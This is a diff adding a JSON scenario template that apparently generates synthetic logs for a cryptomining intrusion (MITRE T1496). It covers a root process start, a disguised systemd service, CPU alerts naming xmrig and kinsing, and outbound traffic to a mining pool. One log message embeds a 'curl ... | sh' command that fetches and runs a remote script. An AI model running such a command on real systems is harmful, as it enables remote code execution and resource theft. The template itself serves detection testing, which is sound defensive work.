@@ -1,0 +1,100 @@
+{
+  "technique": "T1496",
+  "tactic": "TA0040",
+  "name": "Resource Hijacking",
+  "story": "A miner lands on a server; CPU climbs and stays up.",
+  "nominal_seconds": 900,
+  "entities": {
+    "target": {
+      "oneOf": [
+        "srv-prod-01",
+        "app-server-01",
+        "db-01",
+        "web-01",
+        "fileserv-01"
+      ]
+    },
+    "pool_ip": {
+      "ipv4Host": "198.51.100"
+    },
+    "user": {
+      "oneOf": [
+        "svc_backup",
+        "svc_report",
+        "svc_deploy"
+      ]
+    }
+  },
+  "pools": {
+    "procs": [
+      "xmrig",
+      "kdevtmpfsi",
+      "kinsing"
+    ]
+  },
+  "steps": [
+    {
+      "gap": "30s",
+      "spread": "10s",
+      "count": 1,
+      "level": "INFO",
+      "source": {
+        "type": "host",
+        "name": "bash",
+        "host": "{{target}}"
+      },
+      "message": "pid={{pid}} uid=0 cmd=curl -s http://{{pool_ip}}/x.sh | sh",
+      "metadata": {
+        "event_action": "process-start",
+        "user": "{{user}}"
+      }
+    },
+    {
+      "gap": "15s",
+      "spread": "5s",
+      "count": 1,
+      "level": "WARN",
+      "source": {
+        "type": "host",
+        "name": "systemd",
+        "host": "{{target}}"
+      },
+      "message": "Started {{procs}}.service - system maintenance helper",
+      "metadata": {
+        "event_action": "service-installed"
+      }
+    },
+    {
+      "gap": "20s",
+      "spread": "420s",
+      "count": 60,
+      "level": "WARN",
+      "source": {
+        "type": "server",
+        "name": "node-exporter",
+        "host": "{{target}}"
+      },
+      "message": "High CPU usage: {{rand:88-99}}% sustained, top process {{procs}} pid={{pid}}",
+      "metadata": {
+        "event_action": "resource-alert",
+        "metric": "cpu"
+      }
+    },
+    {
+      "gap": "10s",
+      "spread": "300s",
+      "count": 30,
+      "level": "INFO",
+      "source": {
+        "type": "firewall",
+        "name": "iptables",
+        "host": "firewall-01"
+      },
+      "message": "ACCEPT OUT=eth1 SRC={{target}} DST={{pool_ip}} PROTO=TCP DPT=3333 bytes={{rand:2000-9000}}",
+      "metadata": {
+        "event_action": "connection-allowed",
+        "protocol": "tcp"
+      }
+    }
+  ]
+}
